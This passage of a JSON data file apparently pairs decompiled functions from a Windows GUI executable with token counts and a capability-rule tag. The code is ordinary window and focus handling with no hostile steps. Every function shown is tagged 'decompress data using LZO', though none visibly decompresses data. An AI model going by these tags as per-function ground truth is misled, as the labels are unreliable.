        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004393d2)\n// WARNING: Removing unreachable block (ram,0x004393de)\n\nvoid fcn.00439388(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x43942b;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack44;\n    fcn.00439230();\n    fcn.00439230();\n    uVar1 = fcn.004059dc(0);\n    uVar1 = fcn.004059dc(0, uVar1);\n    uVar2 = 0x400;\n    sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x439432);\n    return;\n}\n",
        "token_count": 259
    },
    "0043c240": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043c240(uint param_1, int32_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1f) == '\\0') || (3 < *(param_2 + 4))) {\n    // switch table (8 cases) at 0x43c41a\n        switch(*(param_2 + 4)) {\n        case 0:\n            fcn.0043c5b8();\n            break;\n        case 1:\n            fcn.0043c5b8();\n            break;\n        case 2:\n            fcn.0043c148();\n            fcn.0043c5b8();\n            break;\n        case 3:\n            fcn.0043c148();\n            fcn.0043c5b8();\n            break;\n        case 4:\n            if (*(in_EAX + 0x14) < 0x8000) {\n                fcn.0043c5b8();\n            }\n            else {\n                fcn.0043c1e0(&stack0xfffffffc);\n                fcn.0043c5b8();\n            }\n            break;\n        case 5:\n            if (*(in_EAX + 0x1d) != '\\0') {\n                if (*(in_EAX + 0x14) < 0x8000) {\n                    fcn.0043c5b8();\n                }\n                else {\n                    fcn.0043c1e0(&stack0xfffffffc);\n                    fcn.0043c5b8();\n                }\n            }\n            break;\n        case 6:\n            fcn.0043c5b8();\n            break;\n        case 7:\n            fcn.0043c5b8();\n        }\n    }\n    else {\n        if (*(param_2 + 4) < 2) {\n            iVar3 = *(in_EAX + 0x40);\n            var_10h = *(in_EAX + 8) % iVar3;\n        }\n        else if (*(param_2 + 4) - 2 < 2) {\n            iVar3 = *(in_EAX + 0x3c);\n            var_10h = *(in_EAX + 10) % iVar3;\n        }\n        else {\n            iVar3 = 0;\n            var_10h = 0;\n        }\n        var_14h = 0;\n        for (; 0 < iVar3; iVar3 = iVar3 + -1) {\n            iVar2 = sub.kernel32.dll_GetTickCount_1();\n            if (iVar2 - var_14h < *(in_EAX + 0x20)) {\n                sub.kernel32.dll_Sleep_2(*(in_EAX + 0x20) - (iVar2 - var_14h));\n            }\n            iVar1 = *(param_2 + 4);\n            if (iVar1 == 0) {\n                fcn.0043c5b8();\n            }\n            else if (iVar1 == 1) {\n                fcn.0043c5b8();\n            }\n            else if (iVar1 == 2) {\n                fcn.0043c5b8();\n            }\n            else if (iVar1 == 3) {\n                fcn.0043c5b8();\n            }\n            (**(**(in_EAX + 4) + 0x8c))();\n            var_14h = iVar2;\n        }\n        if (0 < var_10h) {\n            iVar1 = *(param_2 + 4);\n            if (iVar1 == 0) {\n                fcn.0043c5b8();\n            }\n            else if (iVar1 == 1) {\n                fcn.0043c5b8();\n            }\n            else if (iVar1 == 2) {\n                fcn.0043c5b8();\n            }\n            else if (iVar1 == 3) {\n                fcn.0043c5b8();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 933
    },
    "004438cc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00443930)\n// WARNING: Removing unreachable block (ram,0x00443950)\n// WARNING: Removing unreachable block (ram,0x00443959)\n// WARNING: Removing unreachable block (ram,0x0044395e)\n// WARNING: Removing unreachable block (ram,0x0044396b)\n// WARNING: Removing unreachable block (ram,0x00443970)\n// WARNING: Removing unreachable block (ram,0x0044397d)\n\nvoid __fastcall fcn.004438cc(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x4439a1;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    (**(*in_EAX + -0x10))();\n    if (**(param_2 + 8) == 0xc) {\n        fcn.004507a0();\n        fcn.00405620();\n        fcn.004059dc();\n        fcn.004507b0();\n        fcn.00450860();\n    }\n    else if (**(param_2 + 8) == 0xb00b) {\n        fcn.0043e3a8();\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x4439a8;\n    uStack28 = 0x4439a0;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 376
    },
    "00445868": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00445868(uint param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    code **ppcVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x445ef3;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack36;\n    param_2[3] = 0;\n    iVar7 = *(*(in_EAX + 0xb0) + 8);\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar7 + -1) {\n        do {\n            puStack28 = puVar1;\n            ppcVar3 = fcn.004198b4();\n            cVar2 = (**ppcVar3)();\n            if (cVar2 != '\\0') {\n                *in_FS_OFFSET = iStack36;\n                return;\n            }\n            iVar7 = iVar7 + -1;\n            puVar1 = puStack28;\n        } while (iVar7 != 0);\n    }\n    fcn.0044571c();\n    iVar7 = *param_2;\n    if (0x53 < iVar7) {\n        if (iVar7 < 0xb018) {\n            if (iVar7 == 0xb017) {\n                if ((*(in_EAX + 0x44) != 0) && (iVar7 = fcn.00458594(),  iVar7 != 0)) {\n                    uVar5 = fcn.00458594();\n                    iVar7 = sub.user32.dll_IsWindowEnabled(uVar5);\n                    if (iVar7 != 0) {\n                        uVar5 = fcn.00458594();\n                        iVar7 = sub.user32.dll_IsWindowVisible(uVar5);\n                        if (iVar7 != 0) {\n                            *0x493508 = 0;\n                            uVar5 = sub.user32.dll_GetFocus();\n                            uVar6 = fcn.00458594();\n                            sub.user32.dll_SetFocus(uVar6);\n                            fcn.00451ae8(param_2[2]);\n                            sub.user32.dll_SetFocus(uVar5);\n                            *0x493508 = 1;\n                            param_2[3] = 1;\n                        }\n                    }\n                }\n                goto code_r0x00445ee9;\n            }\n            if (iVar7 < 0xb001) {\n                if (iVar7 == 0xb000) {\n                    if (*(in_EAX + 0x13a) != 0) {\n                        (**(in_EAX + 0x138))();\n                    }\n                    if ((*(*0x49ac1c + 0x44) != 0) && (cVar2 = fcn.004481b8(),  cVar2 != '\\0')) {\n                        iStack36 = fcn.00458594();\n                        iVar7 = sub.user32.dll_IsWindowEnabled();\n                        if ((iVar7 == 0) && (iVar7 = fcn.00458594(),  iVar7 != *0x49ac44)) {\n                            iStack36 = *0x49ac44;\n                            sub.user32.dll_SetFocus();\n                        }\n                    }\n                    *0x49ac44 = 0;\n                    goto code_r0x00445ee9;\n                }\n                if (iVar7 == 0x112) {\n                    if ((param_2[1] & 0xfff0U) == 0xf020) {\n                        fcn.00445f2c();\n                    }\n                    else if ((param_2[1] & 0xfff0U) == 0xf120) {\n                        fcn.0044600c();\n                    }\n                    else {\n                        fcn.004457e0(&stack0xfffffffc);\n                    }\n                    goto code_r0x00445ee9;\n                }\n                if (iVar7 - 0x132U < 7) {\n                    iVar7 = sub.user32.dll_SendMessageA(param_2[2], iVar7 + 0xbc00, param_2[1], param_2[2]);\n                    param_2[3] = iVar7;\n                    goto code_r0x00445ee9;\n                }\n                if (iVar7 - 0x132U == 0x1e8) {\n                    fcn.004321c4();\n                    fcn.00432328();\n                    goto code_r0x00445ee9;\n                }\n            }\n            else {\n                if (iVar7 == 0xb001) {\n                    *0x49ac44 = sub.user32.dll_GetLastActivePopup(*(in_EAX + 0x30));\n                    if (*(in_EAX + 0x132) != 0) {\n                        (**(in_EAX + 0x130))();\n                    }\n                    goto code_r0x00445ee9;\n                }\n                if (iVar7 == 0xb016) {\n                    cVar2 = fcn.004463b8();\n                    if (cVar2 != '\\0') {\n                        param_2[3] = 1;\n                    }\n                    goto code_r0x00445ee9;\n                }\n            }\n        }\n        else if (iVar7 < 0xb021) {\n            if (iVar7 == 0xb020) {\n                if (param_2[1] == 0) {\n                    fcn.004465f8(*param_2[2], param_2[2][1]);\n                }\n                else {\n                    fcn.00446654(*param_2[2], param_2[2][1]);\n                }\n                goto code_r0x00445ee9;\n            }\n            if (iVar7 == 0xb01a) {\n                iVar7 = fcn.0043b6f8();\n                if (((iVar7 == 0) && (iVar7 = sub.user32.dll_GetFocus(),  iVar7 == *(in_EAX + 0x30))) &&\n                   (iVar7 = fcn.0043ba1c(),  iVar7 != 0)) {\n                    sub.user32.dll_SetFocus(iVar7);\n                }\n                goto code_r0x00445ee9;\n            }\n            if (iVar7 == 0xb01f) goto code_r0x00445e16;\n        }\n        else {\n            if (iVar7 == 0xb031) {\n                if (param_2[1] == 1) {\n                    param_2[3] = *(in_EAX + 0xb8);\n                }\n                else {\n                    *(in_EAX + 0xb8) = param_2[2];\n                }\n                goto code_r0x00445ee9;\n            }\n            if (iVar7 - 0xb03fU < 2) {\n                uVar4 = fcn.00447c08();\n                param_2[3] = uVar4 & 0x7f;\n                goto code_r0x00445ee9;\n            }\n        }\n        goto code_r0x00445ee2;\n    }\n    if (iVar7 == 0x53) {\ncode_r0x00445e16:\n        fcn.00446a24();\n        goto code_r0x00445ee9;\n    }\n    if (iVar7 < 0x12) {\n    // switch table (17 cases) at 0x44590c\n        switch(iVar7) {\n        case 0:\n            fcn.0041f760();\n            break;\n        case 1:\n        case 2:\n        case 3:\n        case 4:\n        case 6:\n        case 8:\n        case 9:\n        case 0xb:\n        case 0xc:\n        case 0xd:\n        case 0xe:\n            goto code_r0x00445ee2;\n        case 5:\n            if (param_2[1] == 1) {\n                *0x49ac2c = 1;\n            }\n            break;\n        case 7:\n            sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb01a, 0, 0);\n            fcn.004457e0(&stack0xfffffffc);\n            break;\n        case 10:\n            if (param_2[1] == 0) {\n                fcn.004457e0(&stack0xfffffffc);\n                if ((*(in_EAX + 0xb4) == 0) && (*0x493520 == '\\0')) {\n                    uVar5 = fcn.0043b8bc();\n                    *(in_EAX + 0xb4) = uVar5;\n                }\n                fcn.004453d4();\n            }\n            else {\n                if ((*0x493520 == '\\0') && (fcn.0044542c(),  *(in_EAX + 0xb4) != 0)) {\n                    fcn.0043b980();\n                    *(in_EAX + 0xb4) = 0;\n                }\n                fcn.004457e0(&stack0xfffffffc);\n            }\n            break;\n        case 0xf:\n            iVar7 = fcn.0043b6f8();\n            if (iVar7 == 0) {\n                fcn.004457e0(&stack0xfffffffc);\n            }\n            else {\n                fcn.0044581c(&stack0xfffffffc);\n            }\n            break;\n        case 0x10:\n            if (*(in_EAX + 0x44) != 0) {\n                fcn.004429a0();\n            }\n            break;\n        default:\n            param_2[3] = 1;\n        }\n    }\n    else {\n        if (iVar7 < 0x1d) {\n            if (iVar7 == 0x1c) {\n                fcn.004457e0(&stack0xfffffffc);\n                *(in_EAX + 0xa5) = '\\x01' - (param_2[1] == 0);\n                if (param_2[1] == 0) {\n                    fcn.004453cc();\n                    sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb001, 0, 0);\n                }\n                else {\n                    fcn.0044542c();\n                    sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb000, 0, 0);\n                }\n                goto code_r0x00445ee9;\n            }\n            if (iVar7 == 0x14) {\n                *param_2 = 0x27;\n                fcn.004457e0(&stack0xfffffffc);\n                goto code_r0x00445ee9;\n            }\n            if (iVar7 == 0x16) {\n                if (param_2[1] != 0) {\n                    fcn.0040f328();\n                    fcn.00405388();\n                }\n                goto code_r0x00445ee9;\n            }\n            if (iVar7 == 0x1a) {\n                fcn.0045d620();\n                fcn.00445774();\n                fcn.004457e0(&stack0xfffffffc);\n                goto code_r0x00445ee9;\n            }\n        }\n        else {\n            if (iVar7 == 0x1d) {\n                fcn.00444960();\n                fcn.004457e0(&stack0xfffffffc);\n                goto code_r0x00445ee9;\n            }\n            if (iVar7 == 0x37) {\n                iVar7 = fcn.00445f10();\n                param_2[3] = iVar7;\n                goto code_r0x00445ee9;\n            }\n        }\ncode_r0x00445ee2:\n        fcn.004457e0(&stack0xfffffffc);\n    }\ncode_r0x00445ee9:\n    *in_FS_OFFSET = iStack36;\n    return;\n}\n",
        "token_count": 2651
    },
    "00446178": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00446178(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar auStack268 [244];\n    int32_t iStack24;\n    \n    if ((*(in_EAX + 0xac) == '\\0') || (cVar1 = fcn.004481b8(),  cVar1 != '\\0')) {\n        fcn.00405584();\n        return;\n    }\n    sub.user32.dll_GetWindowTextA(*(in_EAX + 0x30), auStack268, 0x100);\n    fcn.00405620();\n    iStack24 = *param_2;\n    iVar2 = iStack24;\n    if (iStack24 != 0) {\n        iVar2 = *(iStack24 + -4);\n    }\n    if (iVar2 != 0) {\n        return;\n    }\n    fcn.00405584();\n    return;\n}\n",
        "token_count": 219
    },
    "00455690": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00455690(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    int32_t iStack72;\n    uint uVar6;\n    uint arg_ch;\n    uint var_34h;\n    uint lpEventTrack;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *param_2;\n    if (iVar4 < 0x100) {\n        if (0x1f < iVar4) {\n            if (iVar4 == 0x21) {\n                cVar1 = fcn.00455490();\n                if (cVar1 != '\\0') {\n                    if (param_2[3] != 0) {\n                        return;\n                    }\n                    cVar1 = fcn.004588a0();\n                    if (cVar1 == '\\0') {\n                        return;\n                    }\n                    fcn.00451bc4();\n                    return;\n                }\n            }\n            else if (iVar4 == 0x84) {\n                fcn.00451bc4();\n                if (param_2[3] != -1) {\n                    return;\n                }\n                arg_ch = 0;\n                uVar6 = 0;\n                iStack72 = 0x455857;\n                fcn.00450370();\n                iStack72 = 0x455864;\n                iVar4 = fcn.004553cc(uVar6, arg_ch);\n                if (iVar4 == 0) {\n                    return;\n                }\n                param_2[3] = 1;\n                return;\n            }\n            goto code_r0x00455b84;\n        }\n        if (iVar4 == 0x1f) {\n            iVar4 = fcn.00458594();\n            iVar5 = sub.user32.dll_GetCapture();\n            if (((iVar4 == iVar5) && (*0x493710 != 0)) && (*(*0x493710 + 0x30) == in_EAX)) {\n                fcn.00451ae8(0);\n            }\n            goto code_r0x00455b84;\n        }\n        if (iVar4 == 7) {\n            piVar3 = fcn.0043bd2c();\n            if (((piVar3 != NULL) && (((*(piVar3 + 7) & 0x10) == 0 || (piVar3[0xc] == 0)))) &&\n               (cVar1 = (**(*piVar3 + 0xf8))(),  cVar1 == '\\0')) {\n                return;\n            }\n            goto code_r0x00455b84;\n        }\n        if (iVar4 != 8) goto code_r0x00455b84;\n        uVar2 = *(in_EAX + 0x15) & 0x20;\n    }\n    else {\n        if (0xb047 < iVar4) {\n            if (iVar4 == 0xb04a) {\n                if (param_2[1] != '\\0') {\n                    fcn.00459934();\n                }\n                iStack72 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffb8;\n                (**(*in_EAX + 0xb0))();\n                *in_FS_OFFSET = iStack72;\n                if (param_2[1] != '\\0') {\n                    fcn.00459934();\n                }\n                return;\n            }\n            if (((iVar4 == 0xb04e) && ((*(in_EAX + 7) & 0x10) != 0)) && (**0x495d28 != NULL)) {\n                iStack72 = 0x455762;\n                iStack72 = fcn.00458594();\n                (***0x495d28)();\n                fcn.00458594();\n                sub.user32.dll_SetWindowPos();\n            }\n            goto code_r0x00455b84;\n        }\n        if (iVar4 == 0xb047) {\n            piVar3 = fcn.0043bd2c();\n            if ((piVar3 != NULL) && (piVar3 != in_EAX)) {\n                fcn.00451ae8(param_2[2]);\n            }\n            goto code_r0x00455b84;\n        }\n        if (9 < iVar4 - 0x100U) {\n            if (iVar4 - 0x200U < 0xb) {\n                if (iVar4 == 0x200) {\n                    fcn.00418428();\n                    fcn.004502c0();\n                    iVar4 = fcn.0044d5dc();\n                    *0x493710 = iVar4;\n                    if (iVar4 == 0) {\n                        iVar4 = fcn.0044eda8();\n                    }\n                    if (iVar4 != in_EAX[0x8f]) {\n                        if ((((in_EAX[0x8f] != 0) && (*0x493710 == 0)) ||\n                            ((*0x493710 != 0 && (in_EAX[0x8f] == *0x493710)))) ||\n                           ((*0x493710 != 0 && (*(*0x493710 + 0x30) == in_EAX[0x8f])))) {\n                            fcn.00451ae8(0);\n                        }\n                        if (in_EAX[0x8f] != 0) {\n                            fcn.00420284();\n                        }\n                        in_EAX[0x8f] = iVar4;\n                        if (iVar4 != 0) {\n                            fcn.00420044();\n                        }\n                        if (((in_EAX[0x8f] != 0) && (*0x493710 == 0)) ||\n                           ((*0x493710 != 0 && (in_EAX[0x8f] == *0x493710)))) {\n                            iStack72 = 0x4559ff;\n                            fcn.00451ae8(0);\n                        }\n                    }\n                    if (*(in_EAX + 0x8e) == '\\0') {\n                        *(in_EAX + 0x8e) = 1;\n                        fcn.00458594();\n                        iStack72 = 0x455a3e;\n                        sub.comctl32.dll__TrackMouseEvent();\n                    }\n                }\n                cVar1 = fcn.004555dc();\n                if (cVar1 != '\\0') {\n                    if (param_2[3] != 0) {\n                        return;\n                    }\n                    cVar1 = fcn.004588a0();\n                    if (cVar1 == '\\0') {\n                        return;\n                    }\n                    iStack72 = param_2[1];\n                    uVar6 = fcn.00458594(*param_2);\n                    sub.user32.dll_DefWindowProcA(uVar6);\n                    return;\n                }\n            }\n            else if (iVar4 - 0x200U == 0xa3) {\n                *(in_EAX + 0x8e) = 0;\n                if (in_EAX[0x8f] == 0) {\n                    fcn.00451ae8(0);\n                }\n                else {\n                    fcn.00451ae8(0);\n                }\n                in_EAX[0x8f] = 0;\n            }\n            goto code_r0x00455b84;\n        }\n        uVar2 = fcn.0045105c();\n    }\n    if (uVar2 != 0) {\n        return;\n    }\ncode_r0x00455b84:\n    fcn.00451bc4();\n    if (*param_2 == 0x128) {\n        (**(*in_EAX + 0x80))();\n    }\n    return;\n}\n",
        "token_count": 1759
    },
    "00456b9c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00456c01)\n\nvoid fcn.00456b9c(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffc4;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x456cbb;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(*0x495d2c + 0xc) != '\\0') {\n        puVar1 = &stack0xfffffffc;\n        if (*(in_EAX + 0x1bc) != 0) {\n            fcn.00444194();\n            iVar3 = *(in_EAX + 0x1bc);\n            if (iVar3 != 0) {\n                iVar3 = *(iVar3 + -4);\n            }\n            uVar2 = fcn.004059dc(0);\n            uVar2 = fcn.004059dc(iVar3, uVar2);\n            in_stack_ffffffc4 = 0x400;\n            iVar3 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n            puVar1 = puStack28;\n            if (iVar3 != 2) {\n                piVar4 = fcn.00443f94();\n                iVar3 = (**(*piVar4 + 0x14))();\n                puVar1 = puStack28;\n                if (iVar3 != 0) {\n                    in_stack_ffffffc4 = *(**0x495d00 + 0x3c);\n                    if (*(in_EAX + 0x1b8) != '\\0') {\n                        piVar4 = fcn.00443f94();\n                        iVar3 = (**(*piVar4 + 0x54))();\n                        if (-1 < iVar3) {\n                            piVar4 = fcn.00443f94();\n                            in_stack_ffffffc4 = (**(*piVar4 + 0x18))();\n                        }\n                    }\n                    sub.user32.dll_ActivateKeyboardLayout(in_stack_ffffffc4, 1);\n                    puVar1 = puStack28;\n                }\n            }\n        }\n        puStack28 = puVar1;\n        fcn.00458594();\n        fcn.0045d908();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffc4;\n    fcn.00405530(0x456cc2);\n    return;\n}\n",
        "token_count": 632
    },
    "00456ccc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00456d2d)\n\nvoid fcn.00456ccc(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffbc;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x456d9b;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(*0x495d2c + 0xc) != '\\0') {\n        puVar1 = &stack0xfffffffc;\n        if (*(in_EAX + 0x1bc) != 0) {\n            fcn.00444194();\n            iVar3 = *(in_EAX + 0x1bc);\n            if (iVar3 != 0) {\n                iVar3 = *(iVar3 + -4);\n            }\n            uVar2 = fcn.004059dc(0);\n            uVar2 = fcn.004059dc(iVar3, uVar2);\n            iVar3 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n            puVar1 = puStack28;\n            if (iVar3 != 2) {\n                in_stack_ffffffbc = *(**0x495d00 + 0x3c);\n                sub.user32.dll_ActivateKeyboardLayout(in_stack_ffffffbc, 1);\n                puVar1 = puStack28;\n            }\n        }\n        puStack28 = puVar1;\n        puVar1 = puStack28;\n        if (*(in_EAX + 0x1b8) == '\\0') {\n            fcn.00458594();\n            fcn.0045d8ec();\n            puVar1 = puStack28;\n        }\n    }\n    puStack28 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffbc;\n    fcn.00405530(0x456da2);\n    return;\n}\n",
        "token_count": 493
    },
    "00459750": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00459750(uint param_1, int16_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0043bd2c();\n    if (iVar1 == 0) {\n        return;\n    }\n    if (param_2 != 9) {\n        if (param_2 == 0x12) {\n            fcn.00451ae8(0);\n            return;\n        }\n        if (3 < param_2 - 0x25U) {\n            return;\n        }\n    }\n    fcn.00451ae8(0);\n    return;\n}\n",
        "token_count": 137
    },
    "00459d64": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00459d64(int32_t param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_18h = *param_2;\n    var_14h = param_2[1];\n    iVar4 = param_2[3];\n    *(in_EAX + 0x96) = 1;\n    uStack56 = 0x459f48;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack60;\n    var_4h = in_EAX;\n    fcn.00450860();\n    fcn.00451b90();\n    iVar2 = fcn.00443d44();\n    if (iVar2 < var_4h[0x13] + var_14h) {\n        var_14h = fcn.00443d44();\n        var_14h = var_14h - var_4h[0x13];\n    }\n    iVar2 = fcn.00443d50();\n    if (iVar2 < var_4h[0x12] + var_18h) {\n        var_18h = fcn.00443d50();\n        var_18h = var_18h - var_4h[0x12];\n    }\n    iVar2 = fcn.00443d38();\n    if (var_18h < iVar2) {\n        var_18h = fcn.00443d38();\n    }\n    iVar2 = fcn.00443d2c();\n    if (iVar4 + 4 < iVar2) {\n        fcn.00443d2c();\n    }\n    uVar3 = fcn.00458594(0xffffffff, var_18h, var_14h, var_4h[0x12], var_4h[0x13], 0x10);\n    sub.user32.dll_SetWindowPos(uVar3);\n    iVar4 = sub.kernel32.dll_GetTickCount_1();\n    if (iVar4 - var_4h[0x97] < 0xfb) {\n        bVar1 = false;\n    }\n    else {\n        if (param_1 != 0) {\n            param_1 = *(param_1 + -4);\n        }\n        bVar1 = param_1 < 100;\n    }\n    if ((bVar1) && (*0x49364c != NULL)) {\n        sub.user32.dll_SystemParametersInfoA(0x1016, 0, &var_8h, 0);\n        if (var_8h != 0) {\n            sub.user32.dll_SystemParametersInfoA(0x1018, 0, &var_8h, 0);\n            if (var_8h == 0) {\n                fcn.0045d524();\n                if (var_14h < var_1ch) {\n                    iVar4 = 0;\n                }\n                else {\n                    iVar4 = 1;\n                }\n            }\n            else {\n                iVar4 = 2;\n            }\n            uVar3 = fcn.00458594(100, *(iVar4 * 4 + 0x493754) | 0x40000);\n            (**0x49364c)(uVar3);\n        }\n    }\n    fcn.004551a4();\n    uVar3 = fcn.00458594(4);\n    sub.user32.dll_ShowWindow();\n    (**(*var_4h + 0x80))();\n    *in_FS_OFFSET = uVar3;\n    iVar4 = sub.kernel32.dll_GetTickCount_1(0x459f4f);\n    var_4h[0x97] = iVar4;\n    *(var_4h + 0x96) = 0;\n    return;\n}\n",
        "token_count": 943
    },
    "0045c364": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045c364(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x45c376;\n    fcn.004059cc();\n    uStack24 = 0x45c3d3;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    puStack20 = &stack0xfffffffc;\n    (**(**(arg_8h + -4) + 0x10))();\n    if (0 < in_EAX) {\n        (**(**(arg_8h + -4) + 0x10))();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x45c3da;\n    uStack24 = 0x45c3d2;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 262
    },
    "0045f4ec": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0045f4ec(void)\n\n{\n    fcn.004059dc();\n    fcn.0045f548();\n    fcn.0045f6c8();\n    return;\n}\n",
        "token_count": 45
    },
    "00461154": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00461154(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4611c5;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    if (0 < in_EAX) {\n        do {\n            fcn.00409e8c();\n            fcn.00405818();\n            in_EAX = in_EAX + -1;\n        } while (in_EAX != 0);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4611cc;\n    uStack32 = 0x4611c4;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 235
    },
    "004611d4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
